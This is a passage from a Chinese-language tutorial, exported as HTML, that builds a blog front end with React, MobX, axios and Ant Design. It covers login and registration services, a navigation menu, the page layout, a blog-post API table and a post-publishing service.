<span style="color: #000000; background-color: #ffffff;">                        </span>&lt;<span style="color: #0000ff;">p</span> <span style="color: #a0522d;">className</span>=<span style="color: #8b2252;">"message"</span>&gt;<span style="color: #000000; background-color: #ffffff;">&#36824;&#26410;&#27880;&#20876;&#65311; </span>&lt;<span style="color: #0000ff;">Link</span> <span style="color: #a0522d;">to</span>=<span style="color: #8b2252;">"/reg"</span>&gt;<span style="color: #000000; background-color: #ffffff;">&#35831;&#27880;&#20876;</span>&lt;/<span style="color: #0000ff;">Link</span>&gt;&lt;/<span style="color: #0000ff;">p</span>&gt;
<span style="color: #000000; background-color: #ffffff;">                    </span>&lt;/<span style="color: #0000ff;">form</span>&gt;
<span style="color: #000000; background-color: #ffffff;">                </span>&lt;/<span style="color: #0000ff;">div</span>&gt;
<span style="color: #000000; background-color: #ffffff;">            </span>&lt;/<span style="color: #0000ff;">div</span>&gt;
        )
    }
}
</pre>
</div>

<p>
service/user.js
</p>
<div class="org-src-container">
<pre class="src src-js"><span style="color: #b22222;">// </span><span style="color: #b22222;">import axios from 'axios';</span>
<span style="color: #a020f0;">import</span> { observable } from <span style="color: #8b2252;">"mobx"</span>;
<span style="color: #a020f0;">import</span> axios from <span style="color: #8b2252;">"../axios"</span>;
<span style="color: #a020f0;">import</span> { message } from <span style="color: #8b2252;">'antd'</span>;

<span style="color: #a020f0;">class</span> UserService {
    @observable isLogin = <span style="color: #008b8b;">false</span>;
    @observable isReg = <span style="color: #008b8b;">false</span>;
    @observable captcha = {};

    login(username, password, challenge, key) {
        console.log(username, password, challenge, key); <span style="color: #b22222;">// </span><span style="color: #b22222;">Ajax axios xmlhttprequest</span>

        axios.post({
            url:<span style="color: #8b2252;">'/users/login'</span>,
            data:{username, password, challenge, key}
        }).then(
            value =&gt; {
                console.log(<span style="color: #8b2252;">'&#25104;&#21151;&#20102;&#65281;&#65281;&#65281;&#65281;'</span>, value)
                <span style="color: #008b8b;">this</span>.isLogin = <span style="color: #008b8b;">true</span>;
            },
            reason =&gt; {
                console.log(reason);
                <span style="color: #b22222;">// </span><span style="color: #b22222;">TODO &#22788;&#29702;&#22833;&#36133;&#65292;&#32473;&#29992;&#25143;&#21451;&#22909;&#24615;&#25552;&#31034;</span>
                <span style="color: #b22222;">// </span><span style="color: #b22222;">window.alert(reason.msg);</span>
                message.warning(reason.msg, 8); <span style="color: #b22222;">// </span><span style="color: #b22222;">8&#31186;&#28040;&#22833;</span>
            }
        );
    }

    reg(username, email, password) {
        console.log(username, email, password); <span style="color: #b22222;">// </span><span style="color: #b22222;">Ajax axios xmlhttprequest</span>

        axios.post({
            url:<span style="color: #8b2252;">'/users/'</span>,
            data:{username, email, password}
        }).then(
            value =&gt; {
                console.log(<span style="color: #8b2252;">'&#25104;&#21151;&#20102;&#65281;&#65281;&#65281;&#65281;'</span>, value)
                <span style="color: #008b8b;">this</span>.isReg = <span style="color: #008b8b;">true</span>;
            },
            reason =&gt; {
                console.log(reason);
                <span style="color: #b22222;">// </span><span style="color: #b22222;">TODO &#22788;&#29702;&#22833;&#36133;&#65292;&#32473;&#29992;&#25143;&#21451;&#22909;&#24615;&#25552;&#31034;</span>
                message.warning(reason.msg);
            }
        );
    }

    getCaptcha() {
        <span style="color: #b22222;">// </span><span style="color: #b22222;">get &#35831;&#27714;&#21435;&#21462;&#22238; image_url, key &#22635;&#20805;img&#26631;&#31614;&#30340;src&#65292;key input: hidden</span>
        axios.get({
            url:<span style="color: #8b2252;">'/users/getcaptcha'</span>,
        }).then(
            value =&gt; {
                console.log(<span style="color: #8b2252;">'&#25104;&#21151;&#20102;&#65281;&#65281;&#65281;&#65281;'</span>, value)
                <span style="color: #b22222;">// </span><span style="color: #b22222;">{'key':key, 'image_url':image_url}</span>
                value.image_url = <span style="color: #8b2252;">'/api'</span> + value.image_url;
                <span style="color: #008b8b;">this</span>.captcha = value;
            },
            reason =&gt; {
                console.log(reason);
                <span style="color: #b22222;">// </span><span style="color: #b22222;">TODO &#22788;&#29702;&#22833;&#36133;&#65292;&#32473;&#29992;&#25143;&#21451;&#22909;&#24615;&#25552;&#31034;</span>
                message.warning(reason.msg);
            }
        );
    }

    captchaRefresh() {
        <span style="color: #b22222;">// </span><span style="color: #b22222;">get &#35831;&#27714;refreshr&#30340;url&#21435;&#35843;&#29992;&#21518;&#21488;&#21047;&#26032;&#26032;&#20989;&#25968; image_url, key &#22635;&#20805;img&#26631;&#31614;&#30340;src&#65292;key input: hidden</span>
        axios.get({
            url:<span style="color: #8b2252;">'/captcha/refresh/'</span>,
            config: {
                headers: {<span style="color: #8b2252;">'X-Requested-With'</span>: <span style="color: #8b2252;">'XMLHttpRequest'</span>} <span style="color: #b22222;">// </span><span style="color: #b22222;">&#22686;&#21152;&#19968;&#20010;&#22836;&#65292;&#35753;&#21518;&#21488;&#29702;&#35299;&#20026;is_ajax()</span>
            }
        }).then(
            value =&gt; {
                console.log(<span style="color: #8b2252;">'&#25104;&#21151;&#20102;&#65281;&#65281;&#65281;&#65281;'</span>, value)
                <span style="color: #b22222;">// </span><span style="color: #b22222;">{'key':key, 'image_url':image_url}</span>
                value.image_url = <span style="color: #8b2252;">'/api'</span> + value.image_url;
                <span style="color: #008b8b;">this</span>.captcha = {image_url:value.image_url, key:value.key};
            },
            reason =&gt; {
                console.log(reason);
                <span style="color: #b22222;">// </span><span style="color: #b22222;">TODO &#22788;&#29702;&#22833;&#36133;&#65292;&#32473;&#29992;&#25143;&#21451;&#22909;&#24615;&#25552;&#31034;</span>
                message.warning(reason.msg);
            }
        );
    }
}

<span style="color: #a020f0;">const</span> <span style="color: #a0522d;">userService</span> = <span style="color: #a020f0;">new</span> <span style="color: #228b22;">UserService</span>();
<span style="color: #a020f0;">export</span> {userService};
</pre>
</div>
</div>
</div>
</div>
</section>
<section id="outline-container-h:9dcd95c6-7beb-444c-a716-5456bae2c5e9" class="outline-2">
<h2 id="h:9dcd95c6-7beb-444c-a716-5456bae2c5e9">博文业务代码实现和Antd组件</h2>
<div class="outline-text-2" id="text-h:9dcd95c6-7beb-444c-a716-5456bae2c5e9">
</div>
<div id="outline-container-h:b7f03f69-3294-4bfb-a11b-ce2315d98551" class="outline-3">
<h3 id="h:b7f03f69-3294-4bfb-a11b-ce2315d98551">导航菜单</h3>
<div class="outline-text-3" id="text-h:b7f03f69-3294-4bfb-a11b-ce2315d98551">
<p>
菜单网址
</p>
<ul class="org-ul">
<li><a href="https://ant.design/components/menu-cn/">https://ant.design/components/menu-cn/</a></li>
</ul>

<p>
Menu 菜单组件
</p>
<ul class="org-ul">
<li>mode有水平、垂直、内嵌</li>
</ul>

<p>
Menu.Item 菜单项
</p>
<ul class="org-ul">
<li>key菜单项item的唯一标识</li>
</ul>

<p>
修改src/index.js导航菜单
</p>
<div class="org-src-container">
<pre class="src src-js"><span style="color: #b22222;">/*</span><span style="color: #b22222;">src/index.js</span><span style="color: #b22222;">*/</span>
<span style="color: #a020f0;">import</span> React from <span style="color: #8b2252;">'react'</span>;
<span style="color: #a020f0;">import</span> { render } from <span style="color: #8b2252;">'react-dom'</span>;
<span style="color: #a020f0;">import</span> {
  BrowserRouter as Router,
  Switch,
  Route,
  Link
} from <span style="color: #8b2252;">"react-router-dom"</span>;
<span style="color: #a020f0;">import</span> Login from <span style="color: #8b2252;">'./component/login'</span>;
<span style="color: #a020f0;">import</span> Reg from <span style="color: #8b2252;">'./component/reg'</span>;

<span style="color: #a020f0;">import</span> { Menu, Icon } from <span style="color: #8b2252;">'antd'</span>;

<span style="color: #a020f0;">const</span> <span style="color: #a0522d;">Home</span> = props =&gt; &lt;<span style="color: #0000ff;">h2</span>&gt;<span style="color: #000000; background-color: #ffffff;">Home</span>&lt;/<span style="color: #0000ff;">h2</span>&gt;;
<span style="color: #a020f0;">const</span> <span style="color: #a0522d;">About</span> = props =&gt; &lt;<span style="color: #0000ff;">h2</span>&gt;<span style="color: #000000; background-color: #ffffff;">About</span>&lt;/<span style="color: #0000ff;">h2</span>&gt;;
<span style="color: #a020f0;">const</span> <span style="color: #a0522d;">Default</span> = props =&gt; &lt;<span style="color: #0000ff;">h2</span>&gt;<span style="color: #000000; background-color: #ffffff;">&#32570;&#30465;&#26174;&#31034;</span>&lt;/<span style="color: #0000ff;">h2</span>&gt;;
<span style="color: #a020f0;">const</span> <span style="color: #a0522d;">Always</span> = props =&gt; &lt;<span style="color: #0000ff;">h2</span>&gt;&lt;<span style="color: #0000ff;">hr</span> /&gt;<span style="color: #000000; background-color: #ffffff;">&#39029;&#33050;</span>&lt;/<span style="color: #0000ff;">h2</span>&gt;;
<span style="color: #a020f0;">const</span> <span style="color: #a0522d;">Profile</span> = props =&gt; &lt;<span style="color: #0000ff;">h2</span>&gt;<span style="color: #000000; background-color: #ffffff;">&#29992;&#25143;&#20449;&#24687;: </span>&lt;/<span style="color: #0000ff;">h2</span>&gt;;

<span style="color: #a020f0;">class</span> App <span style="color: #a020f0;">extends</span> React.Component {
  state = {
    current: <span style="color: #8b2252;">'mail'</span>,
  };

  handleClick = e =&gt; {
    console.log(<span style="color: #8b2252;">'click '</span>, e);
    <span style="color: #008b8b;">this</span>.setState({
      current: e.key,
    });
  };
  render() {
    <span style="color: #a020f0;">return</span> &lt;<span style="color: #0000ff;">Router</span>&gt;
<span style="color: #000000; background-color: #ffffff;">      </span>&lt;<span style="color: #0000ff;">div</span>&gt;
<span style="color: #000000; background-color: #ffffff;">        </span>&lt;<span style="color: #0000ff;">Menu</span> <span style="color: #a0522d;">onClick</span>={<span style="color: #008b8b;">this</span>.handleClick} <span style="color: #a0522d;">selectedKeys</span>={[<span style="color: #008b8b;">this</span>.state.current]} 
        <span style="color: #a0522d;">defaultOpenKeys</span>={<span style="color: #8b2252;">'home'</span>} <span style="color: #a0522d;">mode</span>=<span style="color: #8b2252;">"horizontal"</span> <span style="color: #a0522d;">theme</span>=<span style="color: #8b2252;">'dark'</span>&gt;
<span style="color: #000000; background-color: #ffffff;">          </span>&lt;<span style="color: #0000ff;">Menu.Item</span> <span style="color: #a0522d;">key</span>=<span style="color: #8b2252;">"home"</span>&gt;&lt;<span style="color: #0000ff;">Link</span> <span style="color: #a0522d;">to</span>=<span style="color: #8b2252;">"/"</span>&gt;&lt;<span style="color: #0000ff;">Icon</span> <span style="color: #a0522d;">type</span>=<span style="color: #8b2252;">"home"</span> /&gt;<span style="color: #000000; background-color: #ffffff;">&#20027;&#39029;</span>&lt;/<span style="color: #0000ff;">Link</span>&gt;&lt;/<span style="color: #0000ff;">Menu.Item</span>&gt;
<span style="color: #000000; background-color: #ffffff;">          </span>&lt;<span style="color: #0000ff;">Menu.Item</span> <span style="color: #a0522d;">key</span>=<span style="color: #8b2252;">"login"</span>&gt;&lt;<span style="color: #0000ff;">Link</span> <span style="color: #a0522d;">to</span>=<span style="color: #8b2252;">"/login"</span>&gt;&lt;<span style="color: #0000ff;">Icon</span> <span style="color: #a0522d;">type</span>=<span style="color: #8b2252;">"login"</span> /&gt;<span style="color: #000000; background-color: #ffffff;">&#30331;&#24405;</span>&lt;/<span style="color: #0000ff;">Link</span>&gt;&lt;/<span style="color: #0000ff;">Menu.Item</span>&gt;
<span style="color: #000000; background-color: #ffffff;">          </span>&lt;<span style="color: #0000ff;">Menu.Item</span> <span style="color: #a0522d;">key</span>=<span style="color: #8b2252;">"reg"</span>&gt;&lt;<span style="color: #0000ff;">Link</span> <span style="color: #a0522d;">to</span>=<span style="color: #8b2252;">"/reg"</span>&gt;&lt;<span style="color: #0000ff;">Icon</span> <span style="color: #a0522d;">type</span>=<span style="color: #8b2252;">"form"</span> /&gt;<span style="color: #000000; background-color: #ffffff;">&#27880;&#20876;</span>&lt;/<span style="color: #0000ff;">Link</span>&gt;&lt;/<span style="color: #0000ff;">Menu.Item</span>&gt;
<span style="color: #000000; background-color: #ffffff;">          </span>&lt;<span style="color: #0000ff;">Menu.Item</span> <span style="color: #a0522d;">key</span>=<span style="color: #8b2252;">"about"</span>&gt;&lt;<span style="color: #0000ff;">Link</span> <span style="color: #a0522d;">to</span>=<span style="color: #8b2252;">"/about"</span>&gt;<span style="color: #000000; background-color: #ffffff;">&#20851;&#20110;</span>&lt;/<span style="color: #0000ff;">Link</span>&gt;&lt;/<span style="color: #0000ff;">Menu.Item</span>&gt;
<span style="color: #000000; background-color: #ffffff;">        </span>&lt;/<span style="color: #0000ff;">Menu</span>&gt;
<span style="color: #000000; background-color: #ffffff;">        </span>&lt;<span style="color: #0000ff;">Switch</span>&gt;
<span style="color: #000000; background-color: #ffffff;">          </span>&lt;<span style="color: #0000ff;">Route</span> <span style="color: #a0522d;">exact</span> <span style="color: #a0522d;">path</span>={[<span style="color: #8b2252;">"/"</span>, <span style="color: #8b2252;">'/index'</span>]} <span style="color: #a0522d;">component</span>={Home}&gt;&lt;/<span style="color: #0000ff;">Route</span>&gt;
<span style="color: #000000; background-color: #ffffff;">          </span>&lt;<span style="color: #0000ff;">Route</span> <span style="color: #a0522d;">path</span>=<span style="color: #8b2252;">"/login"</span> <span style="color: #a0522d;">component</span>={Login}&gt;&lt;/<span style="color: #0000ff;">Route</span>&gt;
<span style="color: #000000; background-color: #ffffff;">          </span>&lt;<span style="color: #0000ff;">Route</span> <span style="color: #a0522d;">path</span>=<span style="color: #8b2252;">"/reg"</span> <span style="color: #a0522d;">component</span>={Reg}&gt;&lt;/<span style="color: #0000ff;">Route</span>&gt;
<span style="color: #000000; background-color: #ffffff;">          </span>&lt;<span style="color: #0000ff;">Route</span> <span style="color: #a0522d;">path</span>=<span style="color: #8b2252;">"/about"</span> <span style="color: #a0522d;">component</span>={About}&gt;&lt;/<span style="color: #0000ff;">Route</span>&gt;
<span style="color: #000000; background-color: #ffffff;">          </span>&lt;<span style="color: #0000ff;">Route</span> <span style="color: #a0522d;">path</span>=<span style="color: #8b2252;">"/profile"</span> <span style="color: #a0522d;">component</span>={Profile}&gt;&lt;/<span style="color: #0000ff;">Route</span>&gt;
<span style="color: #000000; background-color: #ffffff;">          </span>&lt;<span style="color: #0000ff;">Route</span> <span style="color: #a0522d;">component</span>={Default}&gt;&lt;/<span style="color: #0000ff;">Route</span>&gt;
<span style="color: #000000; background-color: #ffffff;">        </span>&lt;/<span style="color: #0000ff;">Switch</span>&gt;
<span style="color: #000000; background-color: #ffffff;">        </span>&lt;<span style="color: #0000ff;">Route</span> <span style="color: #a0522d;">component</span>={Always}&gt;&lt;/<span style="color: #0000ff;">Route</span>&gt;
<span style="color: #000000; background-color: #ffffff;">      </span>&lt;/<span style="color: #0000ff;">div</span>&gt;
<span style="color: #000000; background-color: #ffffff;">    </span>&lt;/<span style="color: #0000ff;">Router</span>&gt;
  }
}
render(&lt;<span style="color: #0000ff;">App</span> /&gt;, document.getElementById(<span style="color: #8b2252;">'root'</span>));
</pre>
</div>
</div>
</div>
<div id="outline-container-h:021def2b-5cf8-46df-bac4-c2d5612e85c0" class="outline-3">
<h3 id="h:021def2b-5cf8-46df-bac4-c2d5612e85c0">页面布局</h3>
<div class="outline-text-3" id="text-h:021def2b-5cf8-46df-bac4-c2d5612e85c0">
<ul class="org-ul">
<li>采用上中下布局，参考：<a href="https://ant.design/components/layout-cn/">https://ant.design/components/layout-cn/</a></li>
</ul>

<p>
修改src/index.js导航菜单
</p>
<div class="org-src-container">
<pre class="src src-js"><span style="color: #b22222;">/*</span><span style="color: #b22222;">src/index.js</span><span style="color: #b22222;">*/</span>
<span style="color: #a020f0;">import</span> React from <span style="color: #8b2252;">'react'</span>;
<span style="color: #a020f0;">import</span> { render } from <span style="color: #8b2252;">'react-dom'</span>;
<span style="color: #a020f0;">import</span> {
  BrowserRouter as Router,
  Switch,
  Route,
  Link
} from <span style="color: #8b2252;">"react-router-dom"</span>;
<span style="color: #a020f0;">import</span> Login from <span style="color: #8b2252;">'./component/login'</span>;
<span style="color: #a020f0;">import</span> Reg from <span style="color: #8b2252;">'./component/reg'</span>;

<span style="color: #a020f0;">import</span> { Menu, Icon, Layout } from <span style="color: #8b2252;">'antd'</span>;
<span style="color: #a020f0;">const</span> { Header, Content, Footer } = Layout;

<span style="color: #a020f0;">const</span> <span style="color: #a0522d;">Home</span> = props =&gt; &lt;<span style="color: #0000ff;">h2</span>&gt;<span style="color: #000000; background-color: #ffffff;">Home</span>&lt;/<span style="color: #0000ff;">h2</span>&gt;;
<span style="color: #a020f0;">const</span> <span style="color: #a0522d;">About</span> = props =&gt; &lt;<span style="color: #0000ff;">h2</span>&gt;<span style="color: #000000; background-color: #ffffff;">About</span>&lt;/<span style="color: #0000ff;">h2</span>&gt;;
<span style="color: #a020f0;">const</span> <span style="color: #a0522d;">Default</span> = props =&gt; &lt;<span style="color: #0000ff;">h2</span>&gt;<span style="color: #000000; background-color: #ffffff;">&#32570;&#30465;&#26174;&#31034;</span>&lt;/<span style="color: #0000ff;">h2</span>&gt;;
<span style="color: #a020f0;">const</span> <span style="color: #a0522d;">Always</span> = props =&gt; &lt;<span style="color: #0000ff;">h2</span>&gt;<span style="color: #000000; background-color: #ffffff;">blog &#169;2008 Created by Jasper</span>&lt;/<span style="color: #0000ff;">h2</span>&gt;;
<span style="color: #a020f0;">const</span> <span style="color: #a0522d;">Profile</span> = props =&gt; &lt;<span style="color: #0000ff;">h2</span>&gt;<span style="color: #000000; background-color: #ffffff;">&#29992;&#25143;&#20449;&#24687;: </span>&lt;/<span style="color: #0000ff;">h2</span>&gt;;

<span style="color: #a020f0;">class</span> App <span style="color: #a020f0;">extends</span> React.Component {
  state = {
    current: <span style="color: #8b2252;">'home'</span>,
  };

  handleClick = e =&gt; {
    console.log(<span style="color: #8b2252;">'click '</span>, e);
    <span style="color: #008b8b;">this</span>.setState({
      current: e.key,
    });
  };
  render() {
    <span style="color: #a020f0;">return</span> &lt;<span style="color: #0000ff;">Router</span>&gt;
<span style="color: #000000; background-color: #ffffff;">      </span>&lt;<span style="color: #0000ff;">Layout</span> <span style="color: #a0522d;">className</span>=<span style="color: #8b2252;">"layout"</span>&gt;
<span style="color: #000000; background-color: #ffffff;">        </span>&lt;<span style="color: #0000ff;">Header</span>&gt;
<span style="color: #000000; background-color: #ffffff;">          </span>&lt;<span style="color: #0000ff;">Menu</span> <span style="color: #a0522d;">onClick</span>={<span style="color: #008b8b;">this</span>.handleClick}
            <span style="color: #a0522d;">theme</span>=<span style="color: #8b2252;">"dark"</span>
            <span style="color: #a0522d;">mode</span>=<span style="color: #8b2252;">"horizontal"</span>
            <span style="color: #a0522d;">defaultSelectedKeys</span>={[<span style="color: #008b8b;">this</span>.state.current]}
            <span style="color: #a0522d;">style</span>={{ lineHeight: <span style="color: #8b2252;">'64px'</span> }}
          <span style="color: #b22222;">// </span><span style="color: #a0522d;">selectedKeys</span><span style="color: #b22222;">={[this.state.current]}</span>
          &gt;
<span style="color: #000000; background-color: #ffffff;">            </span>&lt;<span style="color: #0000ff;">Menu.Item</span> <span style="color: #a0522d;">key</span>=<span style="color: #8b2252;">"home"</span>&gt;&lt;<span style="color: #0000ff;">Link</span> <span style="color: #a0522d;">to</span>=<span style="color: #8b2252;">"/"</span>&gt;&lt;<span style="color: #0000ff;">Icon</span> <span style="color: #a0522d;">type</span>=<span style="color: #8b2252;">"home"</span> /&gt;<span style="color: #000000; background-color: #ffffff;">&#20027;&#39029;</span>&lt;/<span style="color: #0000ff;">Link</span>&gt;&lt;/<span style="color: #0000ff;">Menu.Item</span>&gt;
<span style="color: #000000; background-color: #ffffff;">            </span>&lt;<span style="color: #0000ff;">Menu.Item</span> <span style="color: #a0522d;">key</span>=<span style="color: #8b2252;">"login"</span>&gt;&lt;<span style="color: #0000ff;">Link</span> <span style="color: #a0522d;">to</span>=<span style="color: #8b2252;">"/login"</span>&gt;&lt;<span style="color: #0000ff;">Icon</span> <span style="color: #a0522d;">type</span>=<span style="color: #8b2252;">"login"</span> /&gt;<span style="color: #000000; background-color: #ffffff;">&#30331;&#24405;</span>&lt;/<span style="color: #0000ff;">Link</span>&gt;&lt;/<span style="color: #0000ff;">Menu.Item</span>&gt;
<span style="color: #000000; background-color: #ffffff;">            </span>&lt;<span style="color: #0000ff;">Menu.Item</span> <span style="color: #a0522d;">key</span>=<span style="color: #8b2252;">"reg"</span>&gt;&lt;<span style="color: #0000ff;">Link</span> <span style="color: #a0522d;">to</span>=<span style="color: #8b2252;">"/reg"</span>&gt;&lt;<span style="color: #0000ff;">Icon</span> <span style="color: #a0522d;">type</span>=<span style="color: #8b2252;">"form"</span> /&gt;<span style="color: #000000; background-color: #ffffff;">&#27880;&#20876;</span>&lt;/<span style="color: #0000ff;">Link</span>&gt;&lt;/<span style="color: #0000ff;">Menu.Item</span>&gt;
<span style="color: #000000; background-color: #ffffff;">            </span>&lt;<span style="color: #0000ff;">Menu.Item</span> <span style="color: #a0522d;">key</span>=<span style="color: #8b2252;">"about"</span>&gt;&lt;<span style="color: #0000ff;">Link</span> <span style="color: #a0522d;">to</span>=<span style="color: #8b2252;">"/about"</span>&gt;<span style="color: #000000; background-color: #ffffff;">&#20851;&#20110;</span>&lt;/<span style="color: #0000ff;">Link</span>&gt;&lt;/<span style="color: #0000ff;">Menu.Item</span>&gt;
<span style="color: #000000; background-color: #ffffff;">          </span>&lt;/<span style="color: #0000ff;">Menu</span>&gt;
<span style="color: #000000; background-color: #ffffff;">        </span>&lt;/<span style="color: #0000ff;">Header</span>&gt;
<span style="color: #000000; background-color: #ffffff;">        </span>&lt;<span style="color: #0000ff;">Content</span> <span style="color: #a0522d;">style</span>={{ padding: <span style="color: #8b2252;">'10px 50px'</span> }}&gt;
<span style="color: #000000; background-color: #ffffff;">          </span>&lt;<span style="color: #0000ff;">div</span> <span style="color: #a0522d;">style</span>={{ background: <span style="color: #8b2252;">'#fff'</span>, padding: 24, minHeight: 280 }}&gt;
<span style="color: #000000; background-color: #ffffff;">            </span>&lt;<span style="color: #0000ff;">Switch</span>&gt;
<span style="color: #000000; background-color: #ffffff;">              </span>&lt;<span style="color: #0000ff;">Route</span> <span style="color: #a0522d;">exact</span> <span style="color: #a0522d;">path</span>={[<span style="color: #8b2252;">"/"</span>, <span style="color: #8b2252;">'/index'</span>]} <span style="color: #a0522d;">component</span>={Home}&gt;&lt;/<span style="color: #0000ff;">Route</span>&gt;
<span style="color: #000000; background-color: #ffffff;">              </span>&lt;<span style="color: #0000ff;">Route</span> <span style="color: #a0522d;">path</span>=<span style="color: #8b2252;">"/login"</span> <span style="color: #a0522d;">component</span>={Login}&gt;&lt;/<span style="color: #0000ff;">Route</span>&gt;
<span style="color: #000000; background-color: #ffffff;">              </span>&lt;<span style="color: #0000ff;">Route</span> <span style="color: #a0522d;">path</span>=<span style="color: #8b2252;">"/reg"</span> <span style="color: #a0522d;">component</span>={Reg}&gt;&lt;/<span style="color: #0000ff;">Route</span>&gt;
<span style="color: #000000; background-color: #ffffff;">              </span>&lt;<span style="color: #0000ff;">Route</span> <span style="color: #a0522d;">path</span>=<span style="color: #8b2252;">"/about"</span> <span style="color: #a0522d;">component</span>={About}&gt;&lt;/<span style="color: #0000ff;">Route</span>&gt;
<span style="color: #000000; background-color: #ffffff;">              </span>&lt;<span style="color: #0000ff;">Route</span> <span style="color: #a0522d;">path</span>=<span style="color: #8b2252;">"/profile"</span> <span style="color: #a0522d;">component</span>={Profile}&gt;&lt;/<span style="color: #0000ff;">Route</span>&gt;
<span style="color: #000000; background-color: #ffffff;">              </span>&lt;<span style="color: #0000ff;">Route</span> <span style="color: #a0522d;">component</span>={Default}&gt;&lt;/<span style="color: #0000ff;">Route</span>&gt;
<span style="color: #000000; background-color: #ffffff;">            </span>&lt;/<span style="color: #0000ff;">Switch</span>&gt;
<span style="color: #000000; background-color: #ffffff;">          </span>&lt;/<span style="color: #0000ff;">div</span>&gt;
<span style="color: #000000; background-color: #ffffff;">        </span>&lt;/<span style="color: #0000ff;">Content</span>&gt;
<span style="color: #000000; background-color: #ffffff;">        </span>&lt;<span style="color: #0000ff;">Footer</span> <span style="color: #a0522d;">style</span>={{ textAlign: <span style="color: #8b2252;">'center'</span> }}&gt;
<span style="color: #000000; background-color: #ffffff;">          </span>&lt;<span style="color: #0000ff;">Route</span> <span style="color: #a0522d;">component</span>={Always}&gt;&lt;/<span style="color: #0000ff;">Route</span>&gt;
<span style="color: #000000; background-color: #ffffff;">        </span>&lt;/<span style="color: #0000ff;">Footer</span>&gt;
<span style="color: #000000; background-color: #ffffff;">      </span>&lt;/<span style="color: #0000ff;">Layout</span>&gt;
<span style="color: #000000; background-color: #ffffff;">    </span>&lt;/<span style="color: #0000ff;">Router</span>&gt;
  }
}
render(&lt;<span style="color: #0000ff;">App</span> /&gt;, document.getElementById(<span style="color: #8b2252;">'root'</span>));
</pre>
</div>

<p>
注意，菜单中Link需要包着Icon，否则会错位。
</p>
</div>
</div>
<div id="outline-container-h:7161fae6-e3e7-4cba-ab6d-da240375c45e" class="outline-3">
<h3 id="h:7161fae6-e3e7-4cba-ab6d-da240375c45e">博文业务</h3>
<div class="outline-text-3" id="text-h:7161fae6-e3e7-4cba-ab6d-da240375c45e">
<table>


<colgroup>
<col  class="org-left">

<col  class="org-left">

<col  class="org-left">
</colgroup>
<thead>
<tr>
<th scope="col" class="org-left">url</th>
<th scope="col" class="org-left">method</th>
<th scope="col" class="org-left">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td class="org-left"><i>posts</i></td>
<td class="org-left">POST</td>
<td class="org-left">提交博文的title、content,成功返回json,包含post的id</td>
</tr>

<tr>
<td class="org-left">/posts/id</td>
<td class="org-left">GET</td>
<td class="org-left">返回博文详情，返回json,id,title、author_id、postdate(时间戳)、content</td>
</tr>

<tr>
<td class="org-left"><i>posts</i></td>
<td class="org-left">GET</td>
<td class="org-left">返回博文标题列表，分页</td>
</tr>
</tbody>
</table>
</div>
<div id="outline-container-h:597d0cf2-2f4a-4a6f-a33c-4112a6a2daaf" class="outline-4">
<h4 id="h:597d0cf2-2f4a-4a6f-a33c-4112a6a2daaf">业务层</h4>
<div class="outline-text-4" id="text-h:597d0cf2-2f4a-4a6f-a33c-4112a6a2daaf">
<p>
创建service/post.js文件，新建PostService类。
</p>

<div class="org-src-container">
<pre class="src src-js"><span style="color: #b22222;">/*</span><span style="color: #b22222;">service/post.js</span><span style="color: #b22222;">*/</span>
<span style="color: #a020f0;">import</span> axios from <span style="color: #8b2252;">"../axios"</span>;
<span style="color: #a020f0;">import</span> { observable } from <span style="color: #8b2252;">"mobx"</span>;
<span style="color: #a020f0;">import</span> { message } from <span style="color: #8b2252;">'antd'</span>;

<span style="color: #a020f0;">class</span> PostService {
    @observable success = <span style="color: #008b8b;">false</span>;

    pub(title, content) {
        console.log(<span style="color: #8b2252;">'&#21435;&#22788;&#29702;'</span>, title, content); <span style="color: #b22222;">// </span><span style="color: #b22222;">Ajax axios xmlhttprequest</span>

        axios.post({
            url:<span style="color: #8b2252;">'/posts/'</span>,
            data:{title, content}
        }).then(
            value =&gt; {
                console.log(<span style="color: #8b2252;">'&#25104;&#21151;&#20102;&#65281;&#65281;&#65281;&#65281;'</span>, value)
                message.info(<span style="color: #8b2252;">'&#21338;&#25991;&#25552;&#20132;&#25104;&#21151;'</span>);
                <span style="color: #b22222;">// </span><span style="color: #b22222;">&#22686;&#24378;&#65292;&#30830;&#35748;&#26159;&#21542;&#36339;&#36716;</span>
                <span style="color: #008b8b;">this</span>.success = <span style="color: #008b8b;">true</span>;
            },
            reason =&gt; {
                console.log(reason);
                message.warning(reason.msg || <span style="color: #8b2252;">'&#38169;&#35823;&#65292;&#35831;&#32852;&#31995;&#31649;&#29702;&#21592;'</span>);
            }
        );
    }
}

<span style="color: #a020f0;">const</span> <span style="color: #a0522d;">postService</span> = <span style="color: #a020f0;">new</span> <span style="color: #228b22;">PostService</span>();
<span style="color: #a020f0;">export</span> {postService}
</pre>
</div>
</div>
</div>
<div id="outline-container-h:d0f06259-123b-406c-82d2-e890e09700b6" class="outline-4">
<h4 id="h:d0f06259-123b-406c-82d2-e890e09700b6">发布组件</h4>
<div class="outline-text-4" id="text-h:d0f06259-123b-406c-82d2-e890e09700b6">
<ul class="org-ul">
<li>使用Form组件，<a href="https://ant.design/components/form-cn/">https://ant.design/components/form-cn/</a>
<ul class="org-ul">
<li>表单联动</li>
</ul></li>
</ul>

<div class="org-src-container">
<pre class="src src-js">&lt;Form labelCol={{ span: 5 }} wrapperCol={{ span: 12 }} onSubmit={<span style="color: #008b8b;">this</span>.handleSubmit}&gt;
&#24635;&#20849;24&#20010;&#26629;&#26684;&#65292;&#20174;5&#24320;&#22987;&#65292;input&#21344;12&#20010;
</pre>
</div>

<ul class="org-ul">
<li>输入框-文本域：<a href="https://3x.ant.design/components/input-cn/#components-input-demo-textarea">https://3x.ant.design/components/input-cn/#components-input-demo-textarea</a></li>

<li>Modal对话框: <a href="https://3x.ant.design/components/modal-cn/">https://3x.ant.design/components/modal-cn/</a></li>
</ul>

<p>
创建component/pub.js文件
</p>
<div class="org-src-container">
<pre class="src src-js"><span style="color: #b22222;">/*</span><span style="color: #b22222;">src/component/pub.js&#25991;&#20214;&#20869;&#23481;</span><span style="color: #b22222;"> */</span>
<span style="color: #a020f0;">import</span> React from <span style="color: #8b2252;">'react'</span>;
<span style="color: #a020f0;">import</span> { Link, Redirect } from <span style="color: #8b2252;">'react-router-dom'</span>;
<span style="color: #a020f0;">import</span> { postService as service } from <span style="color: #8b2252;">'../service/post'</span>;
<span style="color: #a020f0;">import</span> { observer } from <span style="color: #8b2252;">'mobx-react'</span>;
<span style="color: #a020f0;">import</span> { inject } from <span style="color: #8b2252;">'../utils'</span>;
<span style="color: #a020f0;">import</span> { Form, Input, Button, Modal } from <span style="color: #8b2252;">'antd'</span>;

@inject({ service })
